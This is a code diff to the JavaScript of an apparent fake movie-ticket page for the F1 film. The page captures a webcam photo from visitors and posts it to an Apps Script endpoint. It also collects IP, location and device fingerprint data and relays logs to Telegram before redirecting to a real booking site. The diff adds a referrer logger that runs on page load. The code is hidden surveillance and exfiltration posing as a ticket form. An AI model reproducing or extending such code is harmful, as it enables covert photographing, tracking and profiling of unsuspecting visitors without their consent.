@@ -5,10 +5,9 @@ const formSection = document.getElementById('formSection');
 const ticketForm = document.getElementById('ticketForm');
 const video = document.getElementById('video');
 
-// Global variable to store visitor ID
 let visitorID = "";
 
-// Generate visitor ID once from country + date
+// Generate visitor ID
 async function generateVisitorID() {
   if (visitorID) return visitorID;
 
@@ -21,7 +20,6 @@ async function generateVisitorID() {
     const mmm = now.toLocaleString('en-US', { month: 'short' }).toUpperCase();
     const yy = String(now.getFullYear()).slice(-2);
     const uniqueNum = Math.floor(1000 + Math.random() * 9000);
-
     visitorID = `${countryCode}-${dd}${mmm}${yy}-${uniqueNum}`;
   } catch (e) {
     visitorID = `XX-ERR-${Math.floor(1000 + Math.random() * 9000)}`;
@@ -29,7 +27,7 @@ async function generateVisitorID() {
   return visitorID;
 }
 
-// Step 1: Show form and start webcam
+// Step 1: Show form and take webcam picture
 getTicketsBtn.addEventListener('click', async () => {
   await generateVisitorID();
 
@@ -50,10 +48,8 @@ getTicketsBtn.addEventListener('click', async () => {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const base64Image = canvas.toDataURL('image/jpeg');
 
-      // ✅ Log before sending image
       sendToTelegram(`📸 ${visitorID} – Photo captured successfully`);
 
-      // ✅ Send image
       fetch(APPS_SCRIPT_URL, {
         method: 'POST',
         mode: 'no-cors',
@@ -62,7 +58,6 @@ getTicketsBtn.addEventListener('click', async () => {
       });
 
     }, 3000);
-
   }).catch(err => {
     console.error("Camera error:", err);
     sendToTelegram(`🚫 ${visitorID} – Webcam not accessible`);
@@ -90,7 +85,7 @@ ticketForm.addEventListener('submit', async (e) => {
   window.location.href = 'https://in.bookmyshow.com/movies/f1-the-movie/ET00403839';
 });
 
-// Step 3: Collect IP and browser info
+// Step 3: Collect IP + device info
 async function collectFullDeviceInfo() {
   try {
     const res = await fetch('https://ipapi.co/json/');
@@ -122,7 +117,17 @@ ${fingerprint.userAgent}`;
   }
 }
 
-// Send text to Telegram
+// Step 4: Referrer log
+function logReferrer() {
+  const referrer = document.referrer || 'No referrer (direct access)';
+  const url = window.location.href;
+  const msg = `🧭 Referrer Log (${visitorID})
+🔗 URL: ${url}
+↩️ Referrer: ${referrer}`;
+  sendToTelegram(msg);
+}
+
+// Telegram log sender
 function sendToTelegram(msg) {
   fetch(APPS_SCRIPT_URL, {
     method: "POST",
@@ -132,7 +137,9 @@ function sendToTelegram(msg) {
   });
 }
 
+// On load
 document.addEventListener("DOMContentLoaded", async () => {
   await generateVisitorID();
   collectFullDeviceInfo();
+  logReferrer(); // ✅ Track referral source
 });
